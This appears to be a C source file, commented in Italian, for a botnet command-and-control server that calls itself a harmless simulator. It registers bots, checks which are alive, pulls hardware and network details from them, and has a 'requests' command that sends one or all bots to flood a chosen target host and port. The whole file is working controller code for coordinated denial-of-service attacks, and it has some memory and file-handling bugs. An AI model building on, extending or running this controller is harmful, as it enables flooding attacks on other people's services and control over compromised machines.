#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <json-c/json.h>
#include <curl/curl.h>
#include <ncurses.h>

#define CHECK_ACTIVE_BOT_TIMEOUT 500L

const char *bot_list_file_name = "botnet.txt";
const char *status_file_name = "status.log";

void handle_get_request(int client_socket);

void handle_post_request(int client_socket, const char *data);

int start_server(int port);

void *server_thread(void *arg);

void *send_request_thread(void *args);

void send_response(int client_socket, int status_code, const char *status_text, const char *response_text);

char *get_formatted_server_info();

void update_bot_list();

int is_bot_active(const char *ip, int port);

void get_bot_info(int record_id);

void get_bot_info_request(const char *ip, const char *port);

size_t write_callback_get_bot_info_request(void *contents, size_t size, size_t nmemb, void *userp);

int get_index(const char *targetHost, const char *targetPort);

void print_page_and_wait(const char *text);

int send_request(char *host, char *port, char *targetHost, char *targetPort, int index);

int send_requests_through_bots(char *host, char *port, int index);

int write_status(int index, const char *host, const char *port, char *status);

void print_status(int botId);

// Definizione di una struttura per passare i parametri al thread
struct ThreadArgs {
    char *targetHost;
    char *targetPort;
    char *client;
};
//Gestione della risposta json di get info
struct MemoryStruct {
    char *memory;
    size_t size;
};
//main method
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        return 1;
    }
    char command[1024];
    int port = atoi(argv[1]);
    // Creazione del thread per la gestione del server
    pthread_t server_thread_id;
    if (pthread_create(&server_thread_id, NULL, server_thread, &port) != 0) {
        perror("Error creating server thread");
        return 1;
    }
    //main thread
    printf("Welcome to botnet!\n\nThis is a botnet simulator without any malicious purpose\n\nYou've got a running cnc listening on port %d\n\nType 'help' for a detailed list of commands available\n\n",
           port);
    while (1) {
        printf("$ ");
        fflush(stdout);

        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;  // Termina il loop in caso di errore o fine dell'input
        }

        // list command
        if (strcmp(command, "help\n") == 0) {
            // Eseguire un'azione di uscita o terminare il server
            printf("\na) botnet\n get the list of ip and ports of active bots with specific target id.\n\nb) requests {hostname} {port} {target}\n Send a massive requests to a specified target with specific port through one or more bots.\n Use wildcard * to send request from all botnet.\n Examples:\n  $ requests localhost 5000 *\n  $ requests localhost 5000 1\n\nc) get info {botId}\n Receive hardware and software information about hosts connected to this botnet.\n Example:\n  $ get info 1\n\nd) get status {botId}\n Get current status of bots.\n Example:\n  $ get status 1\n\n\n\n");
        }
            // botnet command
        else if (strcmp(command, "botnet\n") == 0) {
            update_bot_list(); //testo le porte per verificare che siano ancora in ascolto e modifico il file bot-list.txt qualora non lo fossero più.
            printf("connecting...\n");
            printf("\n");
            char *server_info = get_formatted_server_info();
            if (server_info != NULL) {
                printf("%s\n", server_info);
                free(server_info);
            } else {
                printf("No bot in botnet.\n");
            }
            printf("\n");
        }
            // get info command
        else if (strncmp(command, "get info ", 9) == 0) {
            int bot_id = atoi(command + 9); // Estrai l'argomento numerico dopo "get info "
            // Esegui la funzione getInfo con l'ID del bot
            update_bot_list();
            get_bot_info(bot_id);
        }
            // get status command
        else if (strncmp(command, "get status ", 11) == 0) {
            int bot_id = atoi(command + 11); // Estrai l'argomento numerico dopo "get info "
            update_bot_list();
            print_status(bot_id);
            // requests command
        } else if (strncmp(command, "requests", 8) == 0) {
            char targetHost[256];
            char targetPort[10];
            char client[5];
            int parsed = sscanf(command, "requests %255s %255s %255s", targetHost, targetPort, client);

            if (parsed != 3) {
                printf("Malformed command\n");
                continue;
            }
            update_bot_list();
            struct ThreadArgs *args = (struct ThreadArgs *) malloc(sizeof(struct ThreadArgs));
            args->targetHost = strdup(targetHost);
            args->targetPort = targetPort;
            args->client = client;

            pthread_t request_thread_id;
            pthread_create(&request_thread_id, NULL, send_request_thread, args);

            // Attendere la terminazione del thread
            int *result;
            if (pthread_join(request_thread_id, (void **) &result) != 0) {
                perror("Error joining requests thread");
                return 1;
            }

        }
            // exit command
        else if (strcmp(command, "exit\n") == 0) {
            // Eseguire un'azione di uscita o terminare il server
            exit(0);
        }
    }

    // Attendere il thread del server per terminare e ottenere il risultato
    int *result;
    if (pthread_join(server_thread_id, (void **) &result) != 0) {
        perror("Error joining server thread");
        return 1;
    }

    return *result;
}

// Funzione del thread per la gestione del server e delle richieste
void *server_thread(void *arg) {
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);//abilito cancellazione
    int port = *((int *) arg);
    int result = start_server(port);
    pthread_exit((void *) &result); // Passa l'intero direttamente senza cast
}

void *send_request_thread(void *args) {

    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);//abilito cancellazione

    struct ThreadArgs *threadArgs = (struct ThreadArgs *) args;
    char *targetHost = threadArgs->targetHost;
    char *targetPort = threadArgs->targetPort;
    char *client = threadArgs->client;
    int index = -1;
    if (strcmp(client, "*") != 0) {
        index = atoi(client);
    }
    int result = send_requests_through_bots(targetHost, targetPort, index);

    free(threadArgs);
    pthread_exit((void *) &result); // Passa l'intero direttamente senza cast
}

//risposta di requests
size_t write_callback_send_request(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t real_size = size * nmemb;
    char *response = (char *) userp;

    // Concateniamo i dati ricevuti dalla risposta alla variabile response
    strncat(response, (char *) contents, real_size);

    return real_size;
}

// Function to send a synchronous request
int send_request(char *host, char *port, char *targetHost, char *targetPort, int index) {
    CURL *curl;
    CURLcode res;
    char *response = (char *) malloc(1); // Inizializza con una stringa vuota
    size_t newline_pos = strcspn(port, "\n");

    // Verifica se il carattere '\n' è stato trovato
    if (port[newline_pos] == '\n') {
        // Sostituisci il carattere '\n' con il terminatore di stringa '\0'
        port[newline_pos] = '\0';
    }

    curl = curl_easy_init();
    if (curl) {
        char url[100];
        snprintf(url, sizeof(url), "http://%s:%s", host, port);
        char status[100];
        snprintf(status, sizeof(status), "sending requests to %s and port %s", targetHost, targetPort);
        struct json_object *request_json = json_object_new_object();
        json_object_object_add(request_json, "command", json_object_new_string("requests"));
        json_object_object_add(request_json, "host", json_object_new_string(targetHost));
        json_object_object_add(request_json, "port", json_object_new_string(targetPort));
        const char *request_data = json_object_to_json_string(request_json);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_send_request);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            write_status(index, host, port, status);
        } else {
            printf("Error in the request: %s\n", curl_easy_strerror(res));
            return 1;
        }
        curl_easy_cleanup(curl);
        json_object_put(request_json);
    }
    return 0;
}

int write_status(int index, const char *host, const char *port, char *status) {
    FILE *file = fopen(status_file_name, "a+"); // Apri il file in modalità append/lettura

    if (file == NULL) {
        perror("Errore nell'apertura del file");
        return 1;
    }

    // Calcola il timestamp
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    char timestamp[20];
    strftime(timestamp, 20, "%Y%m%d-%H%M", tm_info);

    char line[200]; // Supponiamo che ogni riga del file abbia meno di 100 caratteri

    // Crea la riga con il formato richiesto
    snprintf(line, sizeof(line), "%d|%s|%s|%s|%s\n", index, host, port, status, timestamp);

    // Cerca se esiste già una riga con lo stesso indice
    char temp[100];
    char *found = NULL;

    while (fgets(temp, sizeof(temp), file)) {
        int current_index;
        if (sscanf(temp, "%d|", &current_index) == 1 && current_index == index) {
            found = temp;
            break;
        }
    }

    if (found != NULL) {
        // Sovrascrivi la riga con le nuove informazioni
        fseek(file, -(long) strlen(found), SEEK_CUR);
        fputs(line, file);
    } else {
        // Scrivi una nuova riga
        fputs(line, file);
    }

    fclose(file);
}

// Start server
int start_server(int port) {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    // Creazione del socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Error creating the socket");
        return 1;
    }

    // Inizializzazione dell'indirizzo del server
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    // Binding del socket all'indirizzo del server
    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        perror("Error binding the socket");
        return 1;
    }

    // Inizio ad ascoltare le connessioni in entrata
    if (listen(server_socket, 5) == -1) {
        perror("Error listening for incoming connections");
        return 1;
    }

    while (1) {
        // Accetto una connessione in entrata
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_socket == -1) {
            perror("Error accepting client connection");
            continue;
        }

        // Il resto del codice rimane invariato
        char request[1024]; // Imposta la dimensione massima della richiesta
        memset(request, 0, sizeof(request));

        // Leggi la richiesta del client
        if (recv(client_socket, request, sizeof(request), 0) == -1) {
            perror("Error reading client request");
            close(client_socket);
            continue;
        }

        if (strstr(request, "GET") != NULL) {
            handle_get_request(client_socket);
        } else if (strstr(request, "POST") != NULL) {
            // Trova i dati POST (supponendo una richiesta semplice senza chunking)
            char *data = strstr(request, "\r\n\r\n") + 4;
            handle_post_request(client_socket, data);
        } else {
            // Gestione di altri tipi di richieste o errori
            char response[] = "HTTP/1.1 501 Not Implemented\r\n\r\n";
            send(client_socket, response, strlen(response), 0);
        }

        // Chiudi la connessione con il client
        close(client_socket);
        // Chiudi la connessione con il client
        close(client_socket);
    }
    // Chiudi il socket del server
    close(server_socket);
    return 0;
}

void handle_get_request(int client_socket) {
    // Gestisci la richiesta GET qui
    // Puoi inviare una risposta al client utilizzando 'send'
    char response[] = "HTTP/1.1 200 OK\r\n"
                      "Content-Type: text/html\r\n\r\n"
                      "<html><body><h1>Hello, World!</h1></body></html>\r\n";
    send(client_socket, response, strlen(response), 0);
}

void handle_post_request(int client_socket, const char *data) {
    struct json_object *json_obj = json_tokener_parse(data);
    if (json_obj == NULL) {
        send_response(client_socket, 400, "Bad Request", "Invalid JSON data");
        return;
    }
    char port_str[10];
    struct json_object *clientIP_obj;
    struct json_object *ports_obj;
    struct json_object *targetIp_obj;
    struct json_object *targetPort_obj;
    struct json_object *clientPort_obj;

    if (json_object_object_get_ex(json_obj, "clientIP", &clientIP_obj) &&
        json_object_object_get_ex(json_obj, "ports", &ports_obj)) {
        const char *clientIP = json_object_get_string(clientIP_obj);
        struct array_list *ports_array = json_object_get_array(ports_obj);
        int num_ports = ports_array->length;

        // Apri o crea il file bot-list.txt in modalità append ("a+")
        FILE *file = fopen(bot_list_file_name, "a+");
        if (file == NULL) {
            send_response(client_socket, 500, "Internal Server Error", "Failed to open file");
            json_object_put(json_obj);
            return;
        }
        int index = 0;
        // Determina l'indice progressivo
        char line[1024];
        while (fgets(line, sizeof(line), file)) {
            index++;
        }

        int added_count = 0; // Contatore per le righe aggiunte

        // Array temporaneo per tenere traccia dei valori delle porte già processati
        const char *processed_ports[1024];
        int processed_count = 0;

        for (int i = 0; i < num_ports; i++) {
            index++;
            const char *port = json_object_get_string(json_object_array_get_idx(ports_obj, i));

            // Verifica se la porta è stata già processata
            int is_duplicate = 0;
            for (int j = 0; j < processed_count; j++) {
                if (strcmp(port, processed_ports[j]) == 0) {
                    is_duplicate = 1;
                    break;
                }
            }

            if (!is_duplicate) {
                // La porta non è duplicata, quindi la aggiungiamo al set di porte processate
                processed_ports[processed_count++] = port;
                strcpy(port_str, port);
                // Scrivi una nuova riga con l'indice progressivo
                fprintf(file, "%d|%s|%s\n", index, clientIP, port);
                added_count++;
            }
        }

        fclose(file);

        //aggiorno lo stato
        char status[100];
        snprintf(status, sizeof(status), "ready to command");
        write_status(index, clientIP, port_str, status);

        // Invia una risposta di successo al client
        send_response(client_socket, 200, "OK", added_count > 0 ? "Data added successfully" : "No new data added");
    } else if (json_object_object_get_ex(json_obj, "targetIP", &targetIp_obj) &&
               json_object_object_get_ex(json_obj, "targetPort", &targetPort_obj) &&
               json_object_object_get_ex(json_obj, "clientIP", &clientIP_obj) &&
               json_object_object_get_ex(json_obj, "port", &clientPort_obj)) {
        const char *targetHost = json_object_get_string(targetIp_obj);
        const char *targetPort = json_object_get_string(targetPort_obj);
        const char *clientHost = json_object_get_string(clientIP_obj);
        const char *clientPort = json_object_get_string(clientPort_obj);
        //scrivere lo stato

        int index = get_index(clientHost, clientPort);
        char status[100];
        snprintf(status, sizeof(status), "finish send requests to %s and port %s", targetHost, targetPort);
        write_status(index, clientHost, clientPort, status);
        send_response(client_socket, 200, "OK", "Message received");
    } else {
        send_response(client_socket, 400, "Bad Request", "Invalid JSON format");
    }
}

// Funzione per inviare una risposta HTTP al client
void send_response(int client_socket, int status_code, const char *status_text, const char *response_text) {
    char response[1024];
    snprintf(response, sizeof(response), "HTTP/1.1 %d %s\r\nContent-Length: %lu\r\n\r\n%s",
             status_code, status_text, strlen(response_text), response_text);
    send(client_socket, response, strlen(response), 0);
}

void update_bot_list() {
    FILE *file = fopen(bot_list_file_name, "r");
    if (file == NULL) {
        return;
    }

    char line[1024];
    char temp_file[1024] = "temp-bot-list.txt"; // Nome del file temporaneo
    FILE *temp = fopen(temp_file, "w");
    if (temp == NULL) {
        perror("Error creating temporary file");
        fclose(file);
        return;
    }

    int record_number = 1; // Inizializza il contatore di righe

    while (fgets(line, sizeof(line), file)) {
        char clientIP[256];
        int port;

        if (sscanf(line, "%*d|%255[^|]|", clientIP) != 1) {
            // Formato di riga non valido, salta
            continue;
        }

        int is_active_record = 0;
        int field_count = 0;
        char *port_str = strtok(line, "|");
        while (port_str != NULL) {
            if (field_count == 2) {
                if (sscanf(port_str, "%d", &port) == 1) {
                    if (is_bot_active(clientIP, port) == 1) {
                        // Il server è attivo su questa porta
                        is_active_record = 1;
                    }
                }
                break;
            }
            field_count++;
            port_str = strtok(NULL, "|");
        }

        if (is_active_record) {
            fprintf(temp, "%d|%s|%d\n", record_number, clientIP,
                    port); // Scrivi il progressivo e l'IP nel file temporaneo
            record_number++; // Incrementa il contatore solo se non è il primo record
        }
    }

    fclose(file);
    fclose(temp);

    // Sostituisci il file originale con il file temporaneo
    if (rename(temp_file, bot_list_file_name) != 0) {
        perror("Error renaming the file");
        return;
    }
}

int is_bot_active(const char *ip, int port) {
    CURL *curl;
    CURLcode res;

    char url[100];
    sprintf(url, "http://%s:%d", ip, port); // Crea l'URL

    // Inizializza cURL
    curl = curl_easy_init();
    if (curl) {
        // Imposta l'URL da verificare
        curl_easy_setopt(curl, CURLOPT_URL, url);
        // Esegui solo la richiesta HEAD
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1);
        // Imposta un timeout di 500 msec
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, CHECK_ACTIVE_BOT_TIMEOUT);
        // Esegui la richiesta
        res = curl_easy_perform(curl);

        // Libera la risorsa cURL
        curl_easy_cleanup(curl);

        // Verifica il risultato della richiesta
        if (res == CURLE_OK) {
            // Il server è attivo su questa porta
            return 1;
        } else {
            // Il server non è attivo su questa porta
            return 0;
        }
    } else {
        // Errore nell'inizializzazione di cURL
        return -1;
    }
}

char *get_formatted_server_info() {
    FILE *file = fopen(bot_list_file_name, "r");
    if (file == NULL) {
        return NULL;
    }

    char *formatted_info = NULL;
    char line[1024];
    int record_number = 1;

    while (fgets(line, sizeof(line), file)) {
        char clientIP[256];
        int port;

        if (sscanf(line, "%*d|%255[^|]|", clientIP) != 1) {
            continue;
        }

        char server_info[1024];
        sprintf(server_info, "%d - bot %s listening on ports: ", record_number, clientIP);
        int field_count = 0;
        char *port_str = strtok(line, "|");
        while (port_str != NULL) {
            if (field_count == 2) {
                if (sscanf(port_str, "%d", &port) == 1) {
                    if (server_info[strlen(server_info) - 1] != ':') {
                        strcat(server_info, " ");
                    }
                    char port_str[10];
                    snprintf(port_str, sizeof(port_str), "%d", port);
                    strcat(server_info, port_str);
                }
            }
            field_count++;
            port_str = strtok(NULL, "|");
        }

        if (formatted_info == NULL) {
            formatted_info = strdup(server_info);
        } else {
            formatted_info = realloc(formatted_info, strlen(formatted_info) + strlen(server_info) + 2);
            strcat(formatted_info, "\n");
            strcat(formatted_info, server_info);
        }

        record_number++;
    }

    fclose(file);
    return formatted_info;
}


// Funzione per ottenere le informazioni del server
void get_bot_info(int record_id) {
    FILE *file = fopen(bot_list_file_name, "r");
    if (!file) {
        printf("No bot in botnet.\n\n");
        return;
    }

    char line[1024];
    char record_ip[256];
    char *record_ports = NULL;
    int count_id = 1;
    while (fgets(line, sizeof(line), file)) {
        if (count_id == record_id) {
            if (sscanf(line, "%*d|%255[^|]|", record_ip) != 1) {
                // Formato di riga non valido, salta
                continue;
            }
            int field_count = 0;
            int port;
            char *port_str = strtok(line, "|");
            while (port_str != NULL) {
                if (field_count == 2) {
                    if (sscanf(port_str, "%d", &port) == 1) {
                        get_bot_info_request(record_ip, port_str);
                        port_str = strtok(NULL, "|");
                        break;
                    }
                }
                field_count++;
                port_str = strtok(NULL, "|");
            }
        }
        count_id++;
    }
    fclose(file);
}


// Funzione per eseguire una richiesta HTTP POST al server
void get_bot_info_request(const char *ip, const char *port_str) {
    struct json_object *request_json = json_object_new_object();
    json_object_object_add(request_json, "command", json_object_new_string("get info"));
    const char *request_data = json_object_to_json_string(request_json);
    int port = atoi(port_str);
    // Esegui la richiesta HTTP POST e ottieni la risposta
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);  // Inizializza il buffer con un byte
    chunk.size = 0;
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        char url[100]; // Sostituisci con l'URL corretto
        snprintf(url, sizeof(url), "http://%s:%d", ip, port);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_get_bot_info_request);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "Errore nella richiesta CURL: %s\n", curl_easy_strerror(res));
            return;
        }

        curl_easy_cleanup(curl);
        char info_str[40960];
        // Analizza la risposta JSON utilizzando json-c
        struct json_object *json = json_tokener_parse(chunk.memory);
        if (json) {
            struct json_object *os_info, *cpu_info, *memory_info, *disk_info, *network_info;
            if (json_object_object_get_ex(json, "infoOS", &os_info) &&
                json_object_object_get_ex(json, "infoCPU", &cpu_info) &&
                json_object_object_get_ex(json, "infoRAM", &memory_info) &&
                json_object_object_get_ex(json, "infoNetwork", &network_info) &&
                json_object_object_get_ex(json, "infoHD", &disk_info)) {
                snprintf(info_str, sizeof(info_str),
                         "OS Information: %s\n\nCPU Information: %s\n\nMemory Information: %s\n\nDisk Information: %s\n\nNetwork Information: %s\n",
                         json_object_get_string(os_info),
                         json_object_get_string(cpu_info),
                         json_object_get_string(memory_info),
                         json_object_get_string(disk_info),
                         json_object_get_string(network_info));
                print_page_and_wait(info_str);
            } else {
                fprintf(stderr, "Information not completed\n");
            }

            json_object_put(json);
        } else {
            fprintf(stderr, "Errore nell'analisi del JSON\n");
        }
        free(chunk.memory);
    }
}

//write callback for get_bot_info
size_t write_callback_get_bot_info_request(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr == NULL) {
        fprintf(stderr, "Errore nell'allocazione della memoria\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = '\0';

    return realsize;
}

void print_page_and_wait(const char *text) {
    initscr();  // Inizializza ncurses
    noecho();   // Non visualizzare gli input dell'utente
    cbreak();   // Abilita l'input in modalità "raw"

    int rows, cols;
    getmaxyx(stdscr, rows, cols);  // Ottieni le dimensioni dello schermo

    int maxLines = rows - 1;  // Lascia una riga per il prompt

    const char *nextLine = text;
    int lineCount = 0;
    int page = 1;

    while (*nextLine) {
        const char *lineEnd = strchr(nextLine, '\n');
        if (lineEnd) {
            int lineLength = lineEnd - nextLine + 1;
            printw("%.*s", lineLength, nextLine);
            nextLine = lineEnd + 1;
        } else {
            printw("%s", nextLine);
            break;
        }

        lineCount++;

        if (lineCount >= maxLines) {
            printw("\n-- Page %d --\nPress any key to continue...", page);
            refresh();
            getch();  // Attendere l'input

            clear();  // Pulisce lo schermo
            lineCount = 0;
            page++;
        }
    }

    printw("\nPress any key to exit...");
    refresh();
    getch();  // Attendere l'input per uscire

    endwin();  // Termina ncurses
}

int get_index(const char *targetHost,const char *targetPort) {
    FILE *file = fopen(bot_list_file_name, "r");
    if (!file) {
        return 1;
    }

    char line[1024];
    int current_index = 0;
    int result;
    while (fgets(line, sizeof(line), file)) {
        current_index++;
        char *index = strtok(line, "|");
        char *host = strtok(NULL, "|");
        char *port = strtok(NULL, "|");
        size_t newline_pos = strcspn(port, "\n");
        if (port[newline_pos] == '\n') {
            port[newline_pos] = '\0';
        }
        if (host && port && strcmp(host, targetHost) == 0 && strcmp(port, targetPort) == 0) {
            fclose((file));
            return current_index;
        }
    }
    fclose((file));
    return current_index;
}

int send_requests_through_bots(char *targetHost, char *targetPort, int index) {
    FILE *file = fopen(bot_list_file_name, "r");
    if (!file) {
        printf("no bot in botnet\n\n");
        return 1;
    }

    char line[1024];
    int current_index = 0;
    int result;
    while (fgets(line, sizeof(line), file)) {
        current_index++;
        if (index == -1 || current_index == index) {
            char *index = strtok(line, "|");
            char *host = strtok(NULL, "|");
            char *port = strtok(NULL, "|");
            if (host && port) {
                result = send_request(host, port, targetHost, targetPort, current_index);
                if (result != 0) {
                    fclose((file));
                    return result;
                }
            }
        }
    }

    fclose(file);
    return 0;
}

void print_status(int botId) {
    FILE *file = fopen(bot_list_file_name, "r");
    if (file == NULL) {
        return;
    }
    char line[1024];
    char record_ip[256];
    int port;
    char *record_ports = NULL;
    int count_id = 1;
    while (fgets(line, sizeof(line), file)) {
        if (count_id == botId) {
            if (sscanf(line, "%*d|%255[^|]|", record_ip) != 1) {
                // Formato di riga non valido, salta
                continue;
            }
            int field_count = 0;
            char *port_str = strtok(line, "|");
            while (port_str != NULL) {
                if (field_count == 2) {
                    if (sscanf(port_str, "%d", &port) == 1) {
                        port_str = strtok(NULL, "|");
                        break;
                    }
                }
                field_count++;
                port_str = strtok(NULL, "|");
            }
        }
        count_id++;
    }
    fclose(file);

    FILE *statusFile = fopen(status_file_name, "r");
    if (file == NULL) {
        return;
    }
    while (fgets(line, sizeof(line), statusFile) != NULL) {
        int id;
        char status_ip[16];
        int status_port;
        char status[128];
        char timestamp[16];

        // Analizza i campi dalla riga
        if (sscanf(line, "%d|%15[^|]|%d|%127[^|]|%15s", &id, status_ip, &status_port, status, timestamp) == 5) {
            if (id == botId && strcmp(status_ip, record_ip) == 0 && port == status_port ) {
                printf("Timestamp: %s, Status: %s\n", timestamp, status);
            }
        }
    }

    fclose(statusFile);
}